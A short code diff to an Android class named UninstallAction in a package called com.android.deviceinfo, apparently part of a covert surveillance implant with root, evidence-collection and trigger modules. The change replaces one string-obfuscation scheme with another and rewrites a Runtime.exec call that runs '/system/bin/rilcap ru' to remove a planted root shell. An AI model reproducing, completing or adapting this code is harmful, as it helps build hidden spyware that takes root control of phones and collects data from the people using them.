@@ -16,8 +16,6 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.deviceinfo.Beep;
-import com.android.deviceinfo.Core;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
@@ -25,12 +23,11 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.evidence.Markup;
-
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.manager.ManagerEvent;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.Check;
-import com.android.deviceinfo.util.Execute;
+import com.android.m.M;
 
 /**
  * The Class UninstallAction.
@@ -90,7 +87,7 @@ public class UninstallAction extends SubActionSlow {
 
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
-				localProcess = Runtime.getRuntime().exec(Messages.getString("32_32"));
+				localProcess = Runtime.getRuntime().exec(M.d("/system/bin/rilcap ru"));
 
 				localProcess.waitFor();
 			} catch (Exception e) {
